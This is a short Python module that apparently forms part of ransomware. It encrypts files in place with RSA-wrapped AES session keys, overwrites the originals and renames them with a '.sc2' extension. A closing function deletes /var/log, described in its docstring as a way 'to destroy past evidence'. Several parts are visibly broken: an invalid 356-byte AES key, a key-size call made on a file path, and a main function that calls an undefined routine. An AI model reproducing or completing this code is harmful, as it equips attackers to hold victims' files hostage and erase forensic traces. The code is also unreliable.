import os

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes


class Encrypter:
    def __init__(self, publicKey, privateKey) -> None:
        self.publicKey = publicKey
        self.privateKey = privateKey

    def encrypt(self, f: str):
        """
        Encrypts a given file with the default public key
        """
        with open(f, "rb") as file:
            data = file.read()

        recipient_key = RSA.import_key(open(self.publicKey).read())
        session_key = get_random_bytes(32)

        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        enc_session_key = cipher_rsa.encrypt(session_key)

        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)

        with open(f, "wb") as file:
            file.write(enc_session_key)
            file.write(cipher_aes.nonce)
            file.write(tag)
            file.write(ciphertext)
        os.rename(f, f + ".sc2")

    def decrypt(self, f: str):
        """
        Decrypts a given file with the default private key
        """
        with open(f, "rb") as file:
            enc_session_key, nonce, tag, ciphertext = [
                file.read(x) for x in (self.privateKey.size_in_bytes(), 16, 16, -1)
            ]

        private_key = RSA.import_key(open(self.privateKey).read())
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)

        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)

        original_filename = f[:-4]  # Remove the .sc2 extension

        with open(original_filename, "wb") as file:
            file.write(data)


def fast_encrypt(f: str, pub_key: bytes):
    """
    Encrypts a file with a give public key
    """
    with open(f, "rb") as file:
        data = file.read()

    recipient_key = RSA.import_key(pub_key)
    session_key = get_random_bytes(356)

    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)

    with open(f, "wb") as file:
        file.write(enc_session_key)
        file.write(cipher_aes.nonce)
        file.write(tag)
        file.write(ciphertext)
    os.rename(f, f + ".sc2")


def main(file: str, PublicKeyey):
    """
    Encrypt a file using the default option of keys stored in text files
    """
    encrypt(file)


def off_to_see_the_wizard():
    """
    Deletes the /var/log directory in order to destroy past evidence
    """
    os.rmdir("/var/log")
    return True
